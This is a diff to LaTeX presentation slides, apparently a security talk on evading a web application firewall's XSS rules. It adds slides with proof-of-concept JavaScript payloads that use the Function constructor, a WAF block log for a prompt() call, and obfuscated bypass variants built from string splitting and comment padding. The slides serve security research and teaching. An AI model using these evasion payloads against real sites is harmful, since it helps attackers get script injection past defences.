@@ -138,8 +138,8 @@
 	\end{columns}
 \end{frame}
 
-\section{Evaluation Methodology}
-\begin{frame}[fragile]{Evaluation Methodology - in general}
+\section{Evaluation methodology}
+\begin{frame}[fragile]{Evaluation methodology - in general}
 	\begin{vfilleditems}
 		\item<2-> Choose PoC XSS payload
 		\item<3-> Obscure payload using evasion technique
@@ -152,7 +152,7 @@
 	\end{vfilleditems}
 \end{frame}
 
-\begin{frame}[fragile]{Evaluation Methodology - developing bypassing payloads}
+\begin{frame}[fragile]{Evaluation methodology - developing bypassing payloads}
 	\begin{vfilleditems}
 		\item<2-> Multiple iterations
 		\item<3-> First iteration: identify potentially effective evasion techniques
@@ -165,16 +165,68 @@
 	\end{vfilleditems}
 \end{frame}
 
+\section{Function constructor}
+\begin{frame}[fragile]{Function constructor}
+	\begin{vfilleditems}
+		\item<2-> Allows to create functions which execute in the global scope
+		\item<3-> Can be used directly to create and execute a function:
+		\begin{lstlisting}[style=basicStyle, language=Python]
+new Function("alert(1)")()
+\end{lstlisting}
+		\item<4-> Can be accessed via built-in objects and functions:
+		\begin{lstlisting}[style=basicStyle, language=Python]
+Error.constructor.constructor("alert(1)")()
+isNaN.constructor("alert(1)")()
+\end{lstlisting}
+	\end{vfilleditems}
+\end{frame}
 
+\begin{frame}[fragile]{Function constructor - prompt(s,s) blocked}
+	% \begin{lstlisting}[style=ruleStyle, language=XML, caption={prompt(1,2) blocked}, label=lst:promptblocked]
+	\begin{lstlisting}[style=ruleStyle, language=XML]
+<payload>var s = 'secret'; prompt(s, s)</payload>
+
+<message>"Javascript method detected"</message>
+<file>"rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
+<fileDetails>[line "714"] [id "941390"]<fileDetails>
+<MatchedData>"prompt("</MatchedData>
+\end{lstlisting}
+\end{frame}
+
+\begin{frame}[fragile]{Function constructor - prompt(s,s) bypass 1}
+	\begin{lstlisting}[style=basicStyle, language=Python]
+[]['constructor']['constructor'](`var s = 'secret'; promp` + `t(s, s)`)()
+\end{lstlisting}
+\end{frame}
+
+
+\begin{frame}[fragile]{Function constructor - prompt(s,s) bypass 1 - invalid}
+	\begin{lstlisting}[style=basicStyle, language=Python]
+<img src="1" onerror="[]['constructor']['constructor'](`var" s="secret" ;promp`="" +="" `t(s,="" s)`)()="">
+\end{lstlisting}
+\end{frame}
+
+\begin{frame}[fragile]{Function constructor - prompt(s,s) bypass 2}
+	\begin{lstlisting}[style=basicStyle, language=Python]
+[]['constructor']['constructor'](`var/**/s/**/=/**/    'secret';/**/promp`/**/+/**/`t(s,/**/s)`)()
+\end{lstlisting}
+\end{frame}
+
+\section*{Function constructor demo}
+\begin{frame}[plain, noframenumbering]
+	\centering
+	\vfill
+	\supertext{Function constructor demo}
+	\vfill
+\end{frame}
 
 \section{Aurebesh.js}
 
 \begin{frame}[fragile]{Aurebesh.js}
 	\begin{vfilleditems}
-		\item<2-> Similar to JSFuck \cite{mk/jsfuck}
+		\item<2-> Similar to JSFuck \cite{mk/jsfuck}, also created by Martin Kleppe \cite{mk/aurebesh}
 		\item<3-> Write valid JavaScript statements calling \verb|alert(1)|
 		\item<4-> Using the characters \verb|() + [] ! " = {}| and 1 to 9 other characters of choice
-		\item<5-> Created by Martin Kleppe \cite{mk/aurebesh}
 	\end{vfilleditems}
 \end{frame}
 
